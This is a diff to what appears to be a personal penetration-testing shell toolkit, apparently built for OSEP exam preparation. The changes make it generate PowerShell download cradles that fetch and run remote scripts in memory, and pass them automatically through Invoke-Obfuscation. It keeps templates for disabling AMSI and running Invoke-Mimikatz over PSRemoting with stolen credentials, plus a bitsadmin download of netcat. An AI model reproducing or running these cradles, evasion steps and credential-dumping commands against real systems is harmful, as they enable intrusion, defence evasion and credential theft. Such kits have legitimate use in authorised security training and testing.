@@ -228,13 +228,28 @@ function nginxhere() {
                 echo "If you wish to stop the container run:"
                 echo "nginxstop\n"
                 echo "If you wish to stop the container run: "
-                echo "nginxpurge\n"
+                echo "nginxpurge\n\n"
+
                 echo "Generating a file with PowerShell Download cradles"
-                iexurls $IPV4 $PORT_HTTP | tee iex-commands.txt
+                iexurls $IPV4 $PORT_HTTP | tee iex-cradles.txt
+                echo "use pscradles - to get the cradles\n"
 
 
         else
                 echo -e "${RED}Please enter the HTTP-PORT and HTTPS port as argument: nginxhere 80 443 tun0${NC}"
+        fi
+}
+
+echo -e "pscradles - get PowerShell download gradles - use pscradles | grep <cradle>"
+function pscradles(){
+
+        RED='\033[0;31m'
+        NC='\033[0m' # No Color
+
+        if [ $# -eq 0 ];then
+                cat ~/OSEP/iex-cradles.txt
+        else
+                echo -e "${RED}pscradles - get PowerShell download gradles - use${NC}"
         fi
 }
 
@@ -249,7 +264,11 @@ function iexurls(){
                 PORT=$2
                 find . -name "*.ps1" | while read SCRIPT_PATH 
                         do
-                                echo "iex((New-Object net.webclient).DownloadString('http://$IP:$PORT/$SCRIPT_PATH'))"
+                                DOWNLOAD_CRADLE="iex((New-Object net.webclient).DownloadString('http://$IP:$PORT/$SCRIPT_PATH'))"
+                                DOWNLOAD_CRADLE_OBFS=$(psobfuscatecmd "$DOWNLOAD_CRADLE")
+                                echo "$DOWNLOAD_CRADLE"
+                                echo "$DOWNLOAD_CRADLE_OBFS"
+                                echo "\n"
                         done
         else
                 echo -e "${RED}iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <IP> <PORT>${NC}"
@@ -454,8 +473,8 @@ function msfgenpayloads(){
 echo -e "${YELLOW}${BOLD}\n========================${NC}"
 echo -e "${YELLOW}${BOLD}[ - METASPLOIT - ]${NC}"
 echo -e "${YELLOW}${BOLD}========================${NC}"
-echo "iex - command templates for Windows"
-function iex(){
+echo "pshelp - command templates for Windows"
+function pshelp(){
         cat << EOF
 # Functions of a module
 Get-Command -Module nishang
@@ -467,6 +486,14 @@ Get-Help Get-ServiceDetail
 iex((New-object net.webclient).DownloadString(''))" #in memory
 echo "(new-object System.Net.WebClient).DownloadFile('<url>','C:\\Users\\Public\\<filename>'')" #ondisk
 
+# PSRemoting
+\$SecPassword = ConvertTo-SecureString 'PASSWD' -AsPlainText -Force
+\$Cred = New-a "x64" -object System.Management.Automation.PSCredential('DOMAIN\USER', \$SecPassword)
+\$s = New-PSSession -ComputerName COMPUTER -Credential \$Cred
+Invoke-Command -Session \$s -FilePath C:\AD\Tools\Disable-Amsi.ps1
+Invoke-Command –Session \$s -ScriptBlock {Disable-Amsi}
+Invoke-Command -Session \$s -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1
+Invoke-Command –Session \$s -ScriptBlock {Invoke-Mimikatz}
 
 bitsadmin /transfer myjob /download /priority high http://10.0.0.5/nc64.exe c:\temp\nc.exe
 
@@ -492,14 +519,6 @@ Register-ScheduledTask -TaskName 'TestTask' -Action \$a
 \$task = \$folder.GetTask('TestTask')
 \$task.RunEx(\$null, 0, 0, \$user)
 
-# PSRemoting
-\$SecPassword = ConvertTo-SecureString 'PASSWD' -AsPlainText -Force
-\$Cred = New-a "x64" -object System.Management.Automation.PSCredential('DOMAIN\USER', \$SecPassword)
-\$s = New-PSSession -ComputerName COMPUTER -Credential \$Cred
-Invoke-Command -Session \$s -FilePath C:\AD\Tools\Disable-Amsi.ps1
-Invoke-Command –Session \$s -ScriptBlock {Disable-Amsi}
-Invoke-Command -Session \$s -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1
-Invoke-Command –Session \$s -ScriptBlock {Invoke-Mimikatz}
 
 EOF
 
@@ -562,9 +581,12 @@ function psobfuscatecmd(){
                 echo -n "PowerShell Command: "
                 read PS_COMMAND
                 pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptBlock {$PS_COMMAND} -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet"
-                
+        elif [[ $# -eq 1 ]]; then
+                PS_COMMAND=$1
+                pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptBlock {$PS_COMMAND} -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet"
         else
-                echo -e "${RED}psobfuscatecmd${NC}"
+                echo -e "${RED}Usage: psobfuscatecmd${NC}"
+                echo -e "${RED}Usage: psobfuscatecmd <CMD>${NC}"
         fi
 }
 
